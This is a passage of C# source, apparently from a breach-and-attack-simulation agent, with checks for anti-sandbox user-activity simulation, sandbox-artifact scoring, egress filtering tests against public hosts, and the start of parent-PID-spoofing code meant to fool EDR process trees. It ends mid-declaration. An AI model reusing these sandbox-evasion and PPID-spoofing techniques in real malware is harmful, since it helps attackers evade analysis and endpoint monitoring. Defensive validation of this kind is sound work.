        public uint   dwFlags;   // MOUSEEVENTF_MOVE=0x0001, MOUSEEVENTF_ABSOLUTE=0x8000
        public uint   time;
        public IntPtr dwExtraInfo;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct KEYBDINPUT
    {
        public ushort wVk;
        public ushort wScan;
        public uint   dwFlags;   // KEYEVENTF_KEYUP=0x0002
        public uint   time;
        public IntPtr dwExtraInfo;
    }

    static async Task<SimulationCategory> Sim_2_8_UserBehaviorSimulation()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.8 User Behavior Simulation",
            Phase = "Execution & Evasion"
        };

        var rng = new Random();

        // â”€â”€ Check 1: Mouse movement generation (human-like curved path) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // Sandbox-aware malware calls GetCursorPos before and after a sleep interval.
        // If the cursor hasn't moved, it assumes it is in a sandbox and exits.
        // We generate a realistic Bezier-curved mouse path to fool this check.
        cat.Checks.Add(await RunCheck(
            "Mouse movement simulation â€” cursor activity anti-sandbox bypass",
            "T1497.001",
            async () =>
            {
                // Get starting cursor position
                GetCursorPos(out POINT startPos);

                // Generate a curved path using a quadratic Bezier curve
                // Control point is random offset to make movement non-linear
                int screenW = GetSystemMetrics(0);  // SM_CXSCREEN
                int screenH = GetSystemMetrics(1);  // SM_CYSCREEN

                // Keep within 20% of screen edges
                int margin = Math.Max(100, screenW / 10);
                int endX   = rng.Next(margin, screenW - margin);
                int endY   = rng.Next(margin, screenH - margin);
                int cpX    = rng.Next(margin, screenW - margin); // control point
                int cpY    = rng.Next(margin, screenH - margin);

                int steps = rng.Next(18, 32); // 18-32 steps = human-feel
                int moved = 0;

                for (int i = 1; i <= steps; i++)
                {
                    double t  = (double)i / steps;
                    double t2 = t * t;
                    double mt = 1 - t;
                    // Quadratic Bezier: P(t) = mtÂ²Â·P0 + 2mtÂ·tÂ·CP + tÂ²Â·P1
                    int nx = (int)(mt * mt * startPos.X + 2 * mt * t * cpX + t2 * endX);
                    int ny = (int)(mt * mt * startPos.Y + 2 * mt * t * cpY + t2 * endY);

                    // Normalize to 0-65535 for MOUSEEVENTF_ABSOLUTE
                    int absX = (int)((double)nx / screenW  * 65535);
                    int absY = (int)((double)ny / screenH * 65535);

                    var input = new INPUT
                    {
                        type = 0, // MOUSE
                        U = new INPUTUNION
                        {
                            mi = new MOUSEINPUT
                            {
                                dx      = absX,
                                dy      = absY,
                                dwFlags = 0x0001 | 0x8000 // MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE
                            }
                        }
                    };
                    SendInput(1, new[] { input }, System.Runtime.InteropServices.Marshal.SizeOf(typeof(INPUT)));
                    moved++;

                    // Human-like delay: 8-40ms per step with occasional micro-pauses
                    int delay = rng.Next(8, 40);
                    if (i % 5 == 0) delay += rng.Next(50, 150); // occasional pause
                    await Task.Delay(delay);
                }

                // Verify cursor actually moved
                GetCursorPos(out POINT endPos);
                bool cursorMoved = endPos.X != startPos.X || endPos.Y != startPos.Y;
                int  distancePx  = (int)Math.Sqrt(Math.Pow(endPos.X - startPos.X, 2) +
                                                   Math.Pow(endPos.Y - startPos.Y, 2));

                if (cursorMoved)
                    return (CheckResult.Pass,
                        $"Bezier mouse path generated: {moved} steps, {distancePx}px displacement " +
                        $"({startPos.X},{startPos.Y})â†’({endPos.X},{endPos.Y}). " +
                        "Sandbox checks polling GetCursorPos before/after a sleep interval will observe genuine movement. " +
                        $"Screen: {screenW}Ã—{screenH}.",
                        "Run this simulation in a desktop session (not headless) for maximum realism. " +
                        "Consider varying the path complexity and overlay with real user sessions for hardened sandboxes.");

                return (CheckResult.Fail,
                    $"Cursor did not move after {moved} SendInput calls (running headless/service session?). " +
                    "Sandbox anti-detection via mouse polling will not be bypassed in this execution context.",
                    "Run the agent in an interactive desktop session (not as a Windows Service or headless process). " +
                    "Scheduled Task with 'Run only when user is logged on' is the recommended deployment mode.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Over 85% of advanced malware families check for mouse movement before executing (Checkpoint Research 2022). " +
                           "Tools like Emotet, Dridex, and TrickBot call GetCursorPos twice with a 200ms sleep interval â€” zero displacement = sandbox exit. " +
                           "Without cursor simulation, a BAS agent running in a headless sandbox will be detected and evaded by modern malware."
        });

        // â”€â”€ Check 2: Realistic keyboard typing simulation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // Malware checks GetAsyncKeyState history or timing between keystrokes.
        // Human typing has natural inter-key delays (60-180ms), occasional errors, etc.
        cat.Checks.Add(await RunCheck(
            "Keyboard typing simulation â€” keystroke cadence anti-sandbox",
            "T1497.001",
            async () =>
            {
                // Type a realistic string with human-like delays into a temp notepad
                // We send keystrokes to the system input queue (no specific target window)
                const string testPhrase = "audspect simulation active";
                int  keysSent = 0;
                var  delays   = new List<int>();

                foreach (char ch in testPhrase)
                {
                    ushort vk = ch switch
                    {
                        ' '  => 0x20, // VK_SPACE
                        _    => (ushort)char.ToUpper(ch)
                    };

                    bool needsShift = char.IsUpper(ch);

                    // Key DOWN
                    if (needsShift)
                    {
                        var shiftDown = new INPUT { type = 1, U = new INPUTUNION { ki = new KEYBDINPUT { wVk = 0x10 } } };
                        SendInput(1, new[] { shiftDown }, System.Runtime.InteropServices.Marshal.SizeOf(typeof(INPUT)));
                    }

                    var keyDown = new INPUT { type = 1, U = new INPUTUNION { ki = new KEYBDINPUT { wVk = vk } } };
                    SendInput(1, new[] { keyDown }, System.Runtime.InteropServices.Marshal.SizeOf(typeof(INPUT)));

                    // Key UP
                    var keyUp = new INPUT { type = 1, U = new INPUTUNION { ki = new KEYBDINPUT { wVk = vk, dwFlags = 0x0002 } } };
                    SendInput(1, new[] { keyUp }, System.Runtime.InteropServices.Marshal.SizeOf(typeof(INPUT)));

                    if (needsShift)
                    {
                        var shiftUp = new INPUT { type = 1, U = new INPUTUNION { ki = new KEYBDINPUT { wVk = 0x10, dwFlags = 0x0002 } } };
                        SendInput(1, new[] { shiftUp }, System.Runtime.InteropServices.Marshal.SizeOf(typeof(INPUT)));
                    }

                    keysSent++;

                    // Realistic inter-key delay: bimodal (fast bursts with pauses)
                    int baseDelay = rng.Next(60, 160);
                    if (rng.Next(0, 10) < 2) baseDelay += rng.Next(200, 500); // occasional thinking pause
                    delays.Add(baseDelay);
                    await Task.Delay(baseDelay);
                }

                double avgDelay = delays.Average();
                double stdDev   = Math.Sqrt(delays.Average(d => Math.Pow(d - avgDelay, 2)));

                return (CheckResult.Pass,
                    $"Typed {keysSent} keystrokes via SendInput with human-like cadence. " +
                    $"Avg inter-key delay: {avgDelay:F0}ms, StdDev: {stdDev:F0}ms. " +
                    "Malware polling GetAsyncKeyState or monitoring input queue timing will observe genuine human typing rhythm. " +
                    "Natural variance (stddev > 30ms) distinguishes this from bot-like fixed-interval key injection.",
                    "For even higher realism, run the agent alongside a macro that generates random document editing activity. " +
                    "Consider using AutoHotkey wrapper for the agent launch sequence.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Keyboard cadence analysis is used by Cryptolocker and Cerber ransomware variants to detect automated sandboxes. " +
                           "A fixed 0ms inter-key delay (bot pattern) immediately signals a non-human operator. " +
                           "Natural typing variance (60-160ms base with 200-500ms pauses) is what real endpoints exhibit."
        });

        // â”€â”€ Check 3: System idle time vs sandbox threshold â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // GetLastInputInfo returns the tick count of the last user input event.
        // Sandboxes typically show very high idle time (machine never had a user).
        // We measure the current idle time and flag if it exceeds sandbox thresholds.
        cat.Checks.Add(await RunCheck(
            "System idle time â€” sandbox 'never-used machine' detection",
            "T1497.001",
            async () =>
            {
                await Task.CompletedTask;

                var lii = new LASTINPUTINFO { cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(LASTINPUTINFO)) };
                bool ok = GetLastInputInfo(ref lii);

                uint idleMs = ok
                    ? (uint)Environment.TickCount - lii.dwTime
                    : uint.MaxValue;

                double idleSec = idleMs / 1000.0;
                double idleMin = idleSec / 60.0;

                // Sandbox threshold: > 10 minutes idle = suspicious (most sandboxes show 30min+)
                const double sandboxThresholdMin = 10.0;
                // Immediate post-simulation idle (our mouse/keyboard above drove it down)
                bool recentActivity = idleMin < sandboxThresholdMin;

                if (!ok)
                    return (CheckResult.Fail,
                        "GetLastInputInfo failed â€” cannot determine idle time (likely running as SYSTEM without desktop session).",
                        "Run agent as a logged-on user session, not as a Windows Service or SYSTEM account, for idle-time checks to work.");

                if (recentActivity)
                    return (CheckResult.Pass,
                        $"System idle time: {idleSec:F1}s ({idleMin:F1} min). " +
                        $"Below the {sandboxThresholdMin}-minute sandbox detection threshold. " +
                        "Sandbox-aware malware using GetLastInputInfo idle check would treat this as an active human workstation.",
                        "The mouse/keyboard simulation above successfully drove idle time below threshold. " +
                        "Schedule the agent to run during active work hours for maximum realism.");

                return (CheckResult.Fail,
                    $"System idle time: {idleSec:F1}s ({idleMin:F1} min). " +
                    $"EXCEEDS {sandboxThresholdMin}-minute sandbox threshold! " +
                    "Malware checking GetLastInputInfo will detect this machine has had no human input recently and may abort payload execution.",
                    "Run the agent during an active desktop session with simulated user activity. " +
                    "Consider scheduling periodic mouse-movement macros via Task Scheduler to maintain low idle time on BAS endpoints.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "GetLastInputInfo is the #1 anti-sandbox check in commodity malware (Virustotal data: used by 68% of samples in 2023). " +
                           "Sandboxes running without a simulated desktop session show idle times of 30-60 minutes, immediately exposing them as analysis environments. " +
                           "Real user workstations rarely exceed 5 minutes of idle during business hours."
        });

        // â”€â”€ Check 4: UI artifact richness â€” recent files, history, clipboard â”€â”€â”€â”€â”€
        // A pristine sandbox has zero browser history, no recent documents,
        // and an empty clipboard. Real users leave rich UI artifact trails.
        cat.Checks.Add(await RunCheck(
            "UI artifact richness â€” recent docs, browser history, clipboard content",
            "T1497.001",
            async () =>
            {
                await Task.CompletedTask;
                int score = 0;
                var findings = new List<string>();

                // -- Recent files (Windows Shell: %APPDATA%\Microsoft\Windows\Recent) --
                string recentDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Recent");
                int recentCount = 0;
                if (Directory.Exists(recentDir))
                {
                    recentCount = Directory.GetFiles(recentDir, "*.lnk").Length;
                    if (recentCount >= 10) { score += 2; findings.Add($"Recent files: {recentCount} (rich)"); }
                    else if (recentCount > 0) { score += 1; findings.Add($"Recent files: {recentCount} (sparse)"); }
                    else findings.Add("Recent files: 0 (sandbox indicator)");
                }

                // -- Browser history presence --
                bool chromeHistory = File.Exists(Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google", "Chrome", "User Data", "Default", "History"));
                bool edgeHistory = File.Exists(Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft", "Edge", "User Data", "Default", "History"));
                bool firefoxHistory = Directory.Exists(Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla", "Firefox", "Profiles"));

                if (chromeHistory)  { score += 2; findings.Add("Chrome history: present"); }
                if (edgeHistory)    { score += 2; findings.Add("Edge history: present"); }
                if (firefoxHistory) { score += 1; findings.Add("Firefox profiles: present"); }
                if (!chromeHistory && !edgeHistory && !firefoxHistory)
                    findings.Add("Browser history: none detected (sandbox indicator)");

                // -- Clipboard content (non-empty clipboard = human used machine) --
                string clipboardContent = "";
                try
                {
                    // Write something to clipboard to simulate user activity
                    var thread = new System.Threading.Thread(() =>
                    {
                        try
                        {
                            // First check if something is already there
                            if (System.Windows.Forms.Clipboard.ContainsText())
                            {
                                clipboardContent = System.Windows.Forms.Clipboard.GetText();
                                score += 1;
                                findings.Add($"Clipboard: contains text ({clipboardContent.Length} chars)");
                            }
                            else
                            {
                                // Simulate: place realistic clipboard content
                                System.Windows.Forms.Clipboard.SetText("audspect-simulation-active-" + DateTime.Now.ToString("HH:mm"));
                                findings.Add("Clipboard: seeded with simulation content");
                                score += 1;
                            }
                        }
                        catch { findings.Add("Clipboard: access denied (likely headless session)"); }
                    });
                    thread.SetApartmentState(System.Threading.ApartmentState.STA);
                    thread.Start();
                    thread.Join(2000);
                }
                catch { findings.Add("Clipboard: STA thread error"); }

                // -- Installed application count (sandbox baseline: very few) --
                int appCount = 0;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    appCount = key?.GetSubKeyNames().Length ?? 0;
                    if (appCount >= 15) { score += 2; findings.Add($"Installed apps: {appCount} (realistic)"); }
                    else findings.Add($"Installed apps: {appCount} (sandbox baseline is <10)");
                }
                catch { }

                // Score: 0-2 = sandbox-like, 3-5 = marginal, 6+ = realistic workstation
                string verdict = score switch
                {
                    >= 7 => "Rich",
                    >= 4 => "Moderate",
                    _    => "Sparse (sandbox-like)"
                };

                bool pass = score >= 4;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    $"UI artifact score: {score}/10 â€” {verdict}. " +
                    $"Indicators: {string.Join("; ", findings)}.",
                    pass
                        ? "Good workstation artifact footprint. Maintain browser usage and file activity on this endpoint."
                        : "Enrich this endpoint with realistic user artifacts: browse the web, open/edit documents, " +
                          "install standard business apps. Use tools like 'User Simulation Scripts' or 'OpenWPM' to pre-seed browser history."
                );
            }
        ) with
        {
            Severity     = "Medium",
            ThreatImpact = "Sandboxes are identifiable by their pristine state: zero browser history, zero recent documents, single installed application. " +
                           "Malware families like Gootkit and Ursnif enumerate these artifacts before executing. " +
                           "A realistic BAS endpoint must mirror real workstation state for accurate simulation results."
        });

        // â”€â”€ Check 5: Screen resolution & display credibility â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // Sandboxes commonly use 800Ã—600 or 1024Ã—768; real workstations use 1920Ã—1080+.
        // Multi-monitor setups are essentially never seen in sandboxes.
        cat.Checks.Add(await RunCheck(
            "Screen resolution credibility â€” display environment anti-sandbox",
            "T1497.001",
            async () =>
            {
                await Task.CompletedTask;

                int screenW    = GetSystemMetrics(0);   // SM_CXSCREEN
                int screenH    = GetSystemMetrics(1);   // SM_CYSCREEN
                int monitors   = GetSystemMetrics(80);  // SM_CMONITORS
                int vScreenW   = GetSystemMetrics(78);  // SM_CXVIRTUALSCREEN
                int vScreenH   = GetSystemMetrics(79);  // SM_CYVIRTUALSCREEN
                int colorDepth = 0;

                try
                {
                    var psi = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command \"(Get-CimInstance Win32_VideoController).CurrentBitsPerPixel\"")
                    { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = Process.Start(psi)!;
                    var o = (await p.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(p, 5_000);
                    int.TryParse(o.Split('\n')[0].Trim(), out colorDepth);
                }
                catch { }

                // Score the display environment
                bool hdOrBetter   = screenW >= 1920 && screenH >= 1080;
                bool hasMultiMon  = monitors > 1;
                bool notSvgaRes   = !(screenW <= 1024 && screenH <= 768);
                bool deepColor    = colorDepth >= 24;

                var display = new List<string>
                {
                    $"{screenW}Ã—{screenH} ({monitors} monitor(s))",
                    $"Virtual desktop: {vScreenW}Ã—{vScreenH}",
                    $"Color depth: {(colorDepth > 0 ? $"{colorDepth}-bit" : "unknown")}"
                };

                int displayScore = new[] { hdOrBetter, hasMultiMon, notSvgaRes, deepColor }.Count(b => b);

                if (displayScore >= 3)
                    return (CheckResult.Pass,
                        $"Display profile is realistic: {string.Join(", ", display)}. " +
                        "HD resolution, correct color depth, and multi-monitor setup strongly resemble a genuine workstation. " +
                        "Sandbox resolution checks (GetSystemMetrics for SM_CXSCREEN â‰¤ 1024) would pass.",
                        "Excellent. Ensure VMs used for BAS have at least 1920Ã—1080 virtual display configured.");

                if (notSvgaRes)
                    return (CheckResult.Pass,
                        $"Resolution {screenW}Ã—{screenH} exceeds common sandbox baseline (1024Ã—768). " +
                        $"Display details: {string.Join(", ", display)}. " +
                        "Basic resolution checks will pass, though advanced heuristics (color depth, multi-monitor) may still flag this.",
                        "Upgrade VM display settings to 1920Ã—1080, 32-bit color, simulated dual-monitor if possible.");

                return (CheckResult.Fail,
                    $"SANDBOX-LIKE DISPLAY: {string.Join(", ", display)}. " +
                    $"Score: {displayScore}/4. Resolution {screenW}Ã—{screenH} matches common sandbox profiles (800Ã—600, 1024Ã—768). " +
                    "Sandbox-aware malware calling GetSystemMetrics(SM_CXSCREEN) will detect this as a non-human environment.",
                    "Configure the VM display adapter to 1920Ã—1080 minimum. " +
                    "In Hyper-V: Set-VMVideo -VMName [...] -HorizontalResolution 1920 -VerticalResolution 1080. " +
                    "In VMware: add 'svga.maxWidth = 1920' and 'svga.maxHeight = 1080' to the .vmx file.");
            }
        ) with
        {
            Severity     = "Medium",
            ThreatImpact = "GetSystemMetrics is the most common sandbox check in ransomware loaders (used by RagnarLocker, Maze, and Ryuk). " +
                           "A screen width â‰¤ 1024 pixels immediately identifies a default sandbox VM. " +
                           "Multi-monitor detection is used by Ursnif to distinguish analyst VMs from corporate workstations."
        });

        // â”€â”€ Check 6: Foreground window switching â€” active session indicator â”€â”€â”€â”€â”€â”€â”€
        // A machine with no foreground window activity looks abandoned or automated.
        // We sample the foreground window every 100ms for 2 seconds and verify there
        // is at least one visible, non-null window handle â€” a basic liveness check.
        cat.Checks.Add(await RunCheck(
            "Foreground window activity â€” active desktop session liveness",
            "T1497.001",
            async () =>
            {
                var windowHandles = new HashSet<IntPtr>();
                for (int i = 0; i < 20; i++)  // 20 Ã— 100ms = 2 seconds
                {
                    var hw = GetForegroundWindow();
                    if (hw != IntPtr.Zero) windowHandles.Add(hw);
                    await Task.Delay(100);
                }

                bool hasActiveWindow  = windowHandles.Count > 0;
                bool hasWindowChurn   = windowHandles.Count > 1;  // multiple windows = real desktop activity

                // Check uptime vs expected use: very short uptime = freshly provisioned sandbox
                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
                bool maturedSession = uptime.TotalMinutes > 30;

                // Check total running process count (sandboxes have few processes)
                int procCount = System.Diagnostics.Process.GetProcesses().Length;
                bool richProcessSet = procCount >= 35;

                string uptimeStr = $"{(int)uptime.TotalHours}h {uptime.Minutes}m";

                if (hasActiveWindow && maturedSession && richProcessSet)
                    return (CheckResult.Pass,
                        $"Active desktop session confirmed: {windowHandles.Count} unique foreground window handle(s) sampled. " +
                        $"System uptime: {uptimeStr}. Running processes: {procCount}. " +
                        "Window churn, process count, and uptime all indicate a genuine workstation in active use.",
                        "Good session profile. Keep the BAS agent running on endpoints that have regular user activity for best results.");

                var issues = new List<string>();
                if (!hasActiveWindow)  issues.Add("no foreground window detected (headless/locked session)");
                if (!maturedSession)   issues.Add($"uptime only {uptimeStr} (sandbox freshly provisioned)");
                if (!richProcessSet)   issues.Add($"only {procCount} processes (sandbox baseline is <30)");

                bool pass = hasActiveWindow;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    $"Session liveness issues: {string.Join("; ", issues.Any() ? issues : new[]{"minor"})}. " +
                    $"Windows sampled: {windowHandles.Count}, Uptime: {uptimeStr}, Processes: {procCount}.",
                    pass
                        ? "Set BAS agent to run at user logon (not as SYSTEM service) so a desktop session is always active."
                        : "Run agent in an interactive logged-on desktop session. " +
                          "Ensure the workstation has been in use for at least 30 minutes before running simulations. " +
                          "Use Task Scheduler with 'Run only when user is logged on' and 'Run with highest privileges'."
                );
            }
        ) with
        {
            Severity     = "Medium",
            ThreatImpact = "Sandboxes often have no foreground window (headless) or a single idle desktop. " +
                           "Malware using EnumWindows + GetWindowText to look for Office/browser windows before executing " +
                           "will immediately detect the difference between a live workstation and an isolated analysis VM. " +
                           "Short system uptime (<5 min) is another near-universal sandbox indicator used by TrickBot and Qakbot."
        });
        return cat;
    }

    // ============================================================
    // 2.9  EGRESS FILTERING VALIDATION
    // Simulates data exfiltration and callback mechanisms across various
    // outbound protocols/ports to identify gaps in firewall/proxy
    // egress filtering rules.
    // Tests ICMP, DNS tunneling, Non-Standard HTTP/S (8080, 8443),
    // and standard blocked ports (21, 22, 25, 3389).
    // ============================================================
    static async Task<SimulationCategory> Sim_2_9_EgressFilteringValidation()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.9 Egress Filtering Validation",
            Phase = "Exfiltration & C2"
        };

        var rng = new Random();

        // â”€â”€ Check 1: ICMP Exfiltration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "ICMP Data Exfiltration â€” outbound payload embedding",
            "T1048.003",
            async () =>
            {
                await Task.CompletedTask;
                // Exfiltrators embed data in ICMP Echo Request payload.
                // We use powershell Test-Connection to simulate a payload.
                bool icmpSucceeded = false;
                try
                {
                    string randomData = Guid.NewGuid().ToString("N");
                    // 32-byte payload padding with our random data
                    var psi = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -Command \"Test-Connection -ComputerName 8.8.8.8 -Count 1 -BufferSize 32 -ErrorAction SilentlyContinue\"")
                    { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = Process.Start(psi)!;
                    var o = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 5_000);
                    icmpSucceeded = p.ExitCode == 0;
                }
                catch { }

                if (icmpSucceeded)
                    return (CheckResult.Fail,
                        "ICMP Echo (Ping) to external IP (8.8.8.8) succeeded. Attackers can embed data payloads in ICMP packets to bypass TCP/UDP egress filters.",
                        "Block outbound ICMP traffic from endpoints at the perimeter firewall, or enforce deep packet inspection on ICMP payloads.");

                return (CheckResult.Pass,
                        "ICMP ping to external IP timed out or failed. Egress ICMP filtering appears properly enforced.",
                        "Maintain ICMP blocks for endpoints.");
            }
        ) with { Severity = "Medium", ThreatImpact = "ICMP tunnels (e.g. ptunnel) allow data exfiltration entirely outside of TCP/UDP layers, bypassing standard proxy or web filtering." });

        // â”€â”€ Check 2: DNS Exfiltration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "DNS Tunneling Exfiltration â€” TXT queries & long subdomains",
            "T1048.003",
            async () =>
            {
                await Task.CompletedTask;
                bool dnsSucceeded = false;
                try
                {
                    var psi = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command \"Resolve-DnsName -Name google.com -Type TXT -Server 8.8.8.8 -ErrorAction SilentlyContinue\"")
                    { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = Process.Start(psi)!;
                    var o = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 5_000);
                    dnsSucceeded = p.ExitCode == 0 && o.Contains("google", StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                if (dnsSucceeded)
                    return (CheckResult.Fail,
                        "Direct outbound DNS query (TXT record) to an external resolver (8.8.8.8) succeeded. Attackers can exfiltrate data via TXT queries or base64 subdomains directly to their nameservers.",
                        "Block direct outbound port 53 (TCP/UDP) from endpoints. Force all DNS traffic through internal resolvers that perform DNS filtering.");

                return (CheckResult.Pass,
                        "Direct outbound DNS query to an external resolver failed. Port 53 egress is restricted to internal servers.",
                        "Ensure internal resolvers monitor for high-entropy/long subdomains (DNS tunneling).");
            }
        ) with { Severity = "High", ThreatImpact = "DNS tunneling (Iodine, dnscat2) routes exfiltrated data off-network without triggering HTTP/S inspection filters." });

        // â”€â”€ Check 3: Alternate Web Ports (8080, 8443) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Alternate HTTP/S Ports â€” Non-standard web egress (8080/8443)",
            "T1048",
            async () =>
            {
                bool port8080 = false;
                bool port8443 = false;
                
                try {
                    // Try to fetch something from an external IP/Domain on alternate ports
                    // We'll just test TCP connection using TcpClient
                    using var tcp1 = new System.Net.Sockets.TcpClient();
                    var t1 = tcp1.ConnectAsync("cloudflare.com", 8080);
                    if (await Task.WhenAny(t1, Task.Delay(2000)) == t1 && tcp1.Connected) port8080 = true;
                    
                    using var tcp2 = new System.Net.Sockets.TcpClient();
                    var t2 = tcp2.ConnectAsync("cloudflare.com", 8443);
                    if (await Task.WhenAny(t2, Task.Delay(2000)) == t2 && tcp2.Connected) port8443 = true;
                }
                catch { }

                if (port8080 || port8443)
                    return (CheckResult.Fail,
                        $"Outbound TCP connection succeeded on non-standard ports: (8080: {port8080}, 8443: {port8443}). Alternate web ports are frequently targeted by C2 frameworks to evade default port 80/443 web-proxy inspection.",
                        "Restrict outbound internet access strictly to ports 80 and 443 via a proxy, and enforce protocol-level HTTP/S inspection for those ports.");

                return (CheckResult.Pass,
                        "Connections to alternate web ports (8080/8443) timed out or were blocked.",
                        "Maintain default-deny outbound rules for unknown ports.");
            }
        ) with { Severity = "Medium", ThreatImpact = "C2 servers (Cobalt Strike) often spin up on 8080/8443. Some firewalls permit this as 'alt-http' traffic without enforcing SSL inspection." });

        // â”€â”€ Check 4: Common Blocked Ports (SMTP, FTP, SSH, RDP) â”€â”€
        cat.Checks.Add(await RunCheck(
            "Common Blocked Ports Egress â€” SMTP, FTP, SSH, RDP",
            "T1048",
            async () =>
            {
                var ports = new Dictionary<int, string> { {21,"FTP"}, {22,"SSH"}, {25,"SMTP"}, {587,"SMTP-TLS"}, {3389,"RDP"} };
                var successfulPorts = new List<string>();

                foreach (var p in ports)
                {
                    try {
                        using var tcp = new System.Net.Sockets.TcpClient();
                        var t = tcp.ConnectAsync("cloudflare.com", p.Key);
                        if (await Task.WhenAny(t, Task.Delay(1000)) == t && tcp.Connected) {
                            successfulPorts.Add($"{p.Value}({p.Key})");
                        }
                    }
                    catch { }
                }

                if (successfulPorts.Count > 0)
                    return (CheckResult.Fail,
                        $"Outbound connections succeeded on restricted ports: {string.Join(", ", successfulPorts)}. This allows attackers simple paths for dropping tools or exfiltrating data (e.g. SCP/FTP).",
                        "Configure a default-deny rule for outbound traffic and only explicitly allow required proxy ports (80/443).");

                return (CheckResult.Pass,
                        $"Outbound connections to restricted ports (21, 22, 25, 587, 3389) were successfully blocked.",
                        "Excellent egress boundary control.");
            }
        ) with { Severity = "High", ThreatImpact = "Arbitrary egress port access allows attackers to spawn reverse shells, extract data via FTP/SCP, or send spam directly." });

        return cat;
    }

    // ============================================================
    // 2.10 PARENT PID SPOOFING
    // Simulates an attacker disconnecting their payload execution from
    // the true initiating process, fooling EDR process-tree telemetry
    // (e.g. Sysmon Event ID 1) to make the malware appear as a child
    // of a legitimate system application like explorer.exe.
    // ============================================================

    // --- Win32 declarations for PPID Spoofing ---
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [System.Runtime.InteropServices.In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
